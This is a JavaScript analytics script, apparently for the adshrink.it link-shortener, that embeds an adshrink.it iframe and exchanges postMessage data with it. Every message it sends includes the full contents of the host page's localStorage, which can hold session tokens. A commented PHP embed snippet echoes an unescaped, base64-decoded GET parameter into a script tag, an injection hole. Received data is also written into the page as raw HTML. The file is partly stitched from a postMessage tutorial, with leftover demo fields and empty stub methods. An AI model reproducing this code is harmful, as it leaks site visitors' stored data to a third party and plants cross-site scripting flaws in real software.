class Adshytics {
	constructor() {
		this.user = false;
		this.version = '0.1.1'
		this.origin = window.location.origin;
		this.ipath = '/children-crossdomain.php?origin=';
		this.iframeid = false;
		this.iframeparent = false;
		this.multishrink = {};

		let elem = document.getElementById('adshytics');
		this.user = elem.getAttribute('user');
		this.owner_origin = elem.getAttribute('origin') || false;
	}
	get eorigin() { return window.btoa(this.origin) } 
	get iframe_url() { return this.get_property_domain() + this.ipath + this.eorigin }
	get supportdata() { return {storage: JSON.stringify(window.localStorage)} }
	get_property_domain = () => {
		return 'https://adshrink.it';
	}
	iframe_onload = async (e) => {
		console.log(e);
		await this.get_owner_iframe();
		this.send_msg_2owner();
	}
	set_iframe = () => {
		if ( this.user === 'owner' ) {
			this.if_owner();
			return false;
		}
		let randomid = (Math.random() * 999999);
		this.iframeid = randomid;
		var ifrm = document.createElement("iframe");
		ifrm.setAttribute("src", this.iframe_url);
		ifrm.id = randomid;
        ifrm.style.width = "100%";
		ifrm.style.height = "100%";
		ifrm.onload = this.iframe_onload;
		document.body.appendChild(ifrm);
		this.if_client();
	}
	get_owner_iframe = async () => {
		this.iframeparent = document.getElementById(this.iframeid).contentWindow;
	}
	send_msg_2owner = (data) => {
		data = {data, ...this.supportdata}
		this.iframeparent.postMessage((data ? data : {'pong': Math.random(), ...this.supportdata}), this.get_property_domain());
	}
	set_handler_client = (event) => {
		console.log("Received a message from " + event.origin + ".");
		// If the window that sent this message is not https://crosscommiframe.app, then
		// that message needs to be thrown out.
		if (event.origin != this.get_property_domain()) {
			console.log("The message came from some site we don't know. We're not processing it.");
			return;
		}
		// When one window sends a message, or data, to another window via
		// `parent.postMessage()`, the message (the first argument) in the
		// `parent.postMessage()` call is accessible via `event.data` here.
		var dataFromChildIframe = event.data;
		// Log the data to the console.
		console.log(dataFromChildIframe);
		// Show that the data was received.
		$(".status-message").text("Data received! This status message will reset in 5 seconds.");
		if (dataFromChildIframe.user_age == 1) {
			$(".user-data .user-age").html("The user is <strong>" + dataFromChildIframe.user_age + "</strong> year old.");
		} else {
			$(".user-data .user-age").html("The user is <strong>" + dataFromChildIframe.user_age + "</strong> years old.");
		}
		$(".user-data .user-height").html("The user is <strong>" + dataFromChildIframe.user_height + "</strong> inches tall.");
		$(".user-data").slideDown(200, function() {
			setTimeout(function() {
				$(".user-data").slideUp(200);
				$(".status-message").html("Waiting for data from <code>https://crosscommiframe.app</code>...");
			}, 5000);
		});
	}
	set_listing_from_owner = () => {
		// Determine how the browser should listen for messages from other
		// windows. If `addEventListener` exists, then use that. Otherwise, use
		// `attachEvent` because an older browser is probably being used. Also,
		// use a callback to handle messages so that both methods of "message
		// listening" can be routed to the same function. The callback in this
		// example is `handleMessage` and it will take one argument (the
		// `MessageEvent` object).
		
		if (window.addEventListener) {
			window.addEventListener("message", this.set_handler_client);
		} else {
			window.attachEvent("onmessage", this.set_handler_client);
		}
		
	}
	set_iframe_params = () => {
		/**
		 * Handle a message that was sent from some window.
		 *
		 * @param {MessageEvent} event The MessageEvent object holding the message/data.
		 */
		$('#origin').text(window.location.origin);
		$('#'+this.iframeid).attr({src:this.iframe_url});
		
		
	}
	multishrink_onclick = () => {
		
	}
	multishrink_onconvert = () => {

	}
	send_msg_2client = () => {

	}
	set_listing_from_client = (e) => {
		if (e.origin != this.owner_origin)
			return;

		$('#pong').text(JSON.stringify(e.data));
		parent.postMessage({adshrink_pong: e.data}, this.owner_origin)
	}
	if_owner = () => {

		$('#pong').text(this.owner_origin)

		if ( this.user !== 'owner' ) 
			return false;
		if ( !this.owner_origin )
			return false;
		
		window.onmessage = this.set_listing_from_client;
		parent.postMessage({adshrink_ping: Math.random()},this.owner_origin);

		const that = this;

		$("form[name='user_data']").submit(function(e) {
			e.preventDefault();
			e.stopPropagation();

			console.log("Sending data to " + this.owner_origin);
			parent.postMessage(
			{
				user_age:    $("input[name='user_age']").val(),
				user_height: $("input[name='user_height']").val(),
			},
			that.owner_origin);
		});
	}
	if_client = () => {
		this.set_iframe_params();
		this.set_listing_from_owner();
	}
}

let scriptjsload = document.createElement("script");
	scriptjsload.setAttribute("src", "https://cdnjs.cloudflare.com/ajax/libs/script.js/2.0.2/script.min.js");
	scriptjsload.setAttribute("integrity", "sha512-UWtTDM6wtl/qutDD6i1JOGZGiEd92dveVzuLl8sMBkMHlOHcbZdexM7ZrKkeaugW7vhqDnWc2pPD/ohEV+BBbg==");
	scriptjsload.setAttribute("crossorigin", "anonymous");
	scriptjsload.onload = async () => {
		$script(['https://code.jquery.com/jquery-3.3.1.min.js'], 'bundle');
		$script.ready('bundle', function() {
			window.adshytics = new Adshytics();
			window.adshytics.set_iframe();
		});
	}
	document.head.appendChild(scriptjsload);

	/*
	<script type="text/javascript">
	    (function(i,s,o,g,r,a,m){i['AdshrinkAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.setAttribute('user','MQ==');a.id=r;m.parentNode.insertBefore(a,m)
        })(window,document,'script','https://adshrink.it/adshytics.js?c=' + (Math.random() * 9999),'adshytics');
	</script>
	<!--OWNER-->
	<script type="text/javascript">
	    (function(i,s,o,g,r,a,m){i['AdshrinkAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.setAttribute('user','owner');a.setAttribute('origin','<?php echo base64_decode($_GET['origin']); ?>');a.id=r;m.parentNode.insertBefore(a,m)
        })(window,document,'script','https://adshrink.it/adshytics.js?c=' + (Math.random() * 9999),'adshytics');
	</script>
	*/
